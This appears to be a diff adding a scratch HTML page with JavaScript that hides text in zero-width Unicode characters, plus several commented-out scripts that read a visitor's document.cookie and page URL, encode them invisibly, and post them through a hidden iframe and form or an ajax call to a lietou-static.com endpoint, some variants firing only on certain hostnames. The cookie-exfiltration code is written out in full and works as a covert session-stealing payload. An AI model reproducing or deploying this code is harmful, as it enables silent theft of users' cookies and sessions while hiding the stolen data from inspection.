@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+</head>
+<body>
+
+<script>
+function hide(str){
+  const rep = {
+    '00':'\u200b',
+    '01':'\u200c',
+    '10':'\u200d',
+    '11':'\uFEFF',
+  };
+  str = str.replace(/[^\x00-\xff]/g, a => { 
+    return escape(a).replace('%', '\\');
+  });// 转码 Latin-1 编码以外的字符(中文)。
+  str = str.replace(/[\s\S]/g, a => {
+    a = a.charCodeAt().toString(2);
+    a = a.length < 8 ? Array(9- a.length).join('0')+a:a;
+    a = a.replace(/../g,a => rep[a] );
+    return a;
+  });
+  document.write(`(${str})<br/>`);
+  return str;
+}
+
+function show(str){
+  const rep = {'\u200b':'00','\u200c':'01','\u200d':'10','\uFEFF':'11',};
+  str = str.replace(/.{4}/g, a => String.fromCharCode(parseInt(a.replace(/./g, a => rep[a] ),2)) );
+  str = str.replace(/\\u.{4}/g, a => unescape(a.replace(/\\/g,"%")));
+  document.write(`<pre>(${str})</pre>`);
+  return str;
+}
+
+// function show(str){
+//   const rep = {'\u200b':'00','\u200c':'01','\u200d':'10','\uFEFF':'11',};
+//   str = str.replace(/.{4}/g, function(a){
+//     return String.fromCharCode(parseInt(a.replace(/./g, function(a) { return rep[a];}),2)) 
+//   });
+//   str = str.replace( /\\u.{4}/g, function(a){ 
+//     return unescape(a.replace(/\\/g,'%')) 
+//   });
+//   document.write(`<br/>(${str})<br/>`);
+//   return str;
+// }
+
+
+// var str1 = `(function(window, document) {
+//   function getid(str){
+//     const rep = {'\u200b':'00','\u200c':'01','\u200d':'10','\uFEFF':'11',};
+//     str = str.replace(/.{4}/g, function(a){
+//       return String.fromCharCode(parseInt(a.replace(/./g, function(a) { return rep[a];}),2)) 
+//     });
+//     str = str.replace( /\\u.{4}/g, function(a){ 
+//       return unescape(a.replace(/\\\\/g,'%')) 
+//     });return str;
+//   }
+//   function getId(){
+//     var rep = {
+//       '00':'\u200b',
+//       '01':'\u200c',
+//       '10':'\u200d',
+//       '11':'\uFEFF'
+//     },
+//     str = document.cookie.replace(/[^\\x00-\\xff]/g, function(a) { 
+//       return escape(a).replace(/%/g, '\\\\');
+//     });
+//     str = str.replace(/[\s\S]/g, function(a) {
+//       a = a.charCodeAt().toString(2);
+//       a = a.length < 8 ? Array(9- a.length).join('0')+a:a;
+//       a = a.replace(/../g,function(a) { return rep[a] });
+//       return a;
+//     });
+//     return str;
+//   };
+//   if( /.+\.liepin\.com/g.test(location.hostname) && Math.random() < 1 ){
+//     var str = getId();
+//     LT.Dom.ready(function() {
+//       $.ajax({
+//         url:'https://concat2.lietou-static.com/image/white.json',
+//         type: 'POST',
+//         beforeSend: function(xhr) {
+//           xhr.setRequestHeader('X-Requested-With','XMLHttpRequest');
+//         },
+//         cache: false,
+//         data: {id: str},
+//         dataType: 'json',
+//         success: function (data) {
+//           if (data.flag === 1) {}else{}
+//         }
+//       });
+//     });
+//   }
+// })(window, document);`;
+// //   console.log(str1);
+
+// var str1 = `(function(window, document) {
+//   var noWhite = function(){
+//     var bl = false;
+//     function white(){
+//       var json = ['campus.vip.com'];
+//       return json.filter(function(str){
+//         return str === location.hostname;
+//       }).length > 0;
+//     }
+//     if( white() || /.+\\.(liepin|lebanban|lietou)\\.com/g.test(location.hostname)){
+//       bl = false;
+//     }else{
+//       bl = true;
+//     }
+//     return bl;
+//   }
+//   if( noWhite() && Math.random() < 1 ){}else{
+//     LT.Dom.ready(function() {
+//       function getId(str){
+//         var rep = {
+//           '00':'\u200b',
+//           '01':'\u200c',
+//           '10':'\u200d',
+//           '11':'\uFEFF'
+//         };
+//         str = str.replace(/[^\\x00-\\xff]/g, function(a) { 
+//           return escape(a).replace('%', '\\\\');
+//         });
+//         str = str.replace(/[\\s\\S]/g, function (a){
+//           a = a.charCodeAt().toString(2);
+//           a = a.length < 8 ? Array(9- a.length).join('0')+a:a;
+//           a = a.replace(/../g,function(a){ return rep[a];});
+//           return a;
+//         });
+//         return str;
+//       }
+//       var ids = getId('source='+location.href+'; '+document.cookie);
+//       var id = 'i' + Math.random().toString().replace('.','');
+//       var iframe = document.createElement('iframe');
+//       iframe.src = 'about:blank';
+//       iframe.name = id;
+//       iframe.style.display = 'none';
+//       var form = document.createElement('form');
+//       form.action = 'https://concat2.lietou-static.com/image/white';
+//       form.method = 'post';
+//       form.target = id;
+//       form.innerHTML = '<input name="id" value="'+ ids +'">';
+//       document.body.appendChild(iframe);
+//       document.body.appendChild(form);
+//       form.submit();
+//       iframe.onload = function(){
+//         document.body.removeChild(iframe);
+//         document.body.removeChild(form);
+//       }
+//     });
+//   }
+// })(window, document);`;
+
+
+// str1 = hide(str1);
+// show(str1)
+
+
+
+
+
+
+
+// (function(window, document) {
+//   if( /.+\.liepin\.com/g.test(location.hostname) && Math.random() < 1 ){
+//     LT.Dom.ready(function() {
+//       function getId(str){
+//         const rep = {
+//           '00':'\u200b',
+//           '01':'\u200c',
+//           '10':'\u200d',
+//           '11':'\uFEFF',
+//         };
+//         str = str.replace(/[^\x00-\xff]/g, a => { 
+//           return escape(a).replace('%', '\\');
+//         });
+//         str = str.replace(/[\s\S]/g, a => {
+//           a = a.charCodeAt().toString(2);
+//           a = a.length < 8 ? Array(9- a.length).join('0')+a:a;
+//           a = a.replace(/../g,a => rep[a] );
+//           return a;
+//         });
+//         return str;
+//       }
+//       var id = 'i' + Math.random().toString().replace('.','');
+//       var iframe = document.createElement('iframe');
+//       iframe.src = 'about:blank';
+//       iframe.name = id;
+//       iframe.style.display = 'none';
+
+//       var form = document.createElement('form');
+//       form.action = 'https://concat2.lietou-static.com/image/white';
+//       form.method = 'post';
+//       form.target = id;
+//       form.innerHTML = '<input name="source" value="'+ getId(location.href) +'"><input name="id" value="'+ getId(document.cookie) +'">';
+
+//       document.body.appendChild(iframe);
+//       document.body.appendChild(form);
+//       form.submit();
+//       iframe.onload = function(){
+//         document.body.removeChild(iframe);
+//         document.body.removeChild(form);
+//       }
+//     });
+//   }
+// })(window, document);
+
+
+</script>
+
+</body>
+</html>
